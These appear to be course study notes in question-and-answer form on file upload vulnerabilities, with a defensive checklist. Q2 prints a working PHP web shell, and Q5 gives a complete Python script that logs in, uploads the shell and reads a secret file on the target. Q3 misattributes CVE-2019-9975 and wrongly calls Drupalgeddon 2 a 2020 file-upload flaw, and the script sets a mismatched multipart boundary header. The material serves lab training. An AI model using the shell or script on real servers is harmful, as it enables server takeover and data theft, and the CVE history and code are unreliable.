---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of a file upload vulnerability and why it is critical in web security.**

A file upload vulnerability occurs when a web application allows users to upload files without proper validation or sanitization. This can lead to serious security issues, such as remote code execution (RCE), where an attacker can upload a malicious file (e.g., a web shell) that can be executed on the server. This is critical because it can compromise the entire server, allowing attackers to steal sensitive data, deface websites, or even gain full control over the server.

**Q2. How would you exploit a file upload vulnerability to achieve remote code execution (RCE)?**

To exploit a file upload vulnerability for RCE, follow these steps:

1. Identify the file upload functionality in the web application.
2. Test if the application allows uploading files with executable extensions (e.g., `.php`, `.asp`).
3. Craft a malicious file (web shell) that can execute arbitrary commands on the server.
4. Upload the crafted file through the file upload feature.
5. Access the uploaded file via its URL to execute commands on the server.

For example, a simple PHP web shell might look like this:

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = $_GET['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
```

Upload this file and access it via a URL like `http://example.com/uploaded_shell.php?cmd=cat%20/home/user/secret`.

**Q3. What recent real-world examples demonstrate the impact of file upload vulnerabilities?**

One notable example is the 2019 WordPress plugin vulnerability (CVE-2019-9975). The WP File Manager plugin had a file upload vulnerability that allowed attackers to upload and execute arbitrary PHP files on the server. This led to numerous instances of compromised websites, where attackers gained full control over the servers and could steal sensitive data or deface sites.

Another example is the 2020 Drupalgeddon 2.0 (CVE-2018-7600), where a file upload vulnerability in the Drupal CMS allowed attackers to upload and execute arbitrary PHP code, leading to server compromise.

**Q4. How would you configure a web application to prevent file upload vulnerabilities?**

To prevent file upload vulnerabilities, configure the web application as follows:

1. **File Type Validation**: Ensure that only specific file types (e.g., images, documents) are allowed for upload.
2. **File Name Sanitization**: Remove or escape potentially dangerous characters from file names.
3. **Content Verification**: Use tools like `file` command or libraries to verify the actual content of the file matches its extension.
4. **Execution Prevention**: Store uploaded files outside the web root directory to prevent direct execution.
5. **Security Headers**: Implement security headers like Content Security Policy (CSP) to mitigate risks associated with malicious scripts.
6. **Regular Audits**: Conduct regular security audits and penetration testing to identify and fix vulnerabilities.

**Q5. Write a Python script to automate the exploitation of a file upload vulnerability similar to the one described in the lecture.**

Here’s a Python script to automate the exploitation of a file upload vulnerability:

```python
import requests
from bs4 import BeautifulSoup
import random
import string

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    return csrf_input['value']

def exploit_file_upload(url):
    session = requests.Session()
    
    # Login
    login_url = f"{url}/login"
    csrf_token = get_csrf_token(session, login_url)
    login_data = {
        'csrf': csrf_token,
        'username': 'irregular_user',
        'password': 'speeder'
    }
    response = session.post(login_url, data=login_data)
    if 'logout' not in response.text:
        print("Login failed")
        return
    
    # Upload PHP shell
    upload_url = f"{url}/my_account/avatar"
    csrf_token = get_csrf_token(session, f"{url}/my_account")
    shell_content = """<?php if(isset($_GET['cmd'])) { echo "<pre>"; $cmd = $_GET['cmd']; system($cmd); echo "</pre>"; } ?>"""
    boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    multipart_form_data = {
        'avatar': ('test.php', shell_content, 'application/x-php'),
        'user': 'irregular_user',
        'csrf': csrf_token
    }
    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
    response = session.post(upload_url, files=multipart_form_data, headers=headers)
    
    # Execute PHP shell
    cmd_url = f"{url}/avatar/test.php?cmd=cat%20/home/Carlos/secret"
    response = session.get(cmd_url)
    print(f"The content of the secret file is: {response.text}")

if __name__ == "__main__":
    url = "http://example.com"
    exploit_file_upload(url)
```

This script automates the process of logging in, uploading a PHP web shell, and executing a command to read the contents of a secret file. Adjust the URLs and credentials as needed for the specific application.

---
<!-- nav -->
[[03-File Upload Vulnerabilities|File Upload Vulnerabilities]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/02-Lab 1 Remote code execution via web shell upload/00-Overview|Overview]]
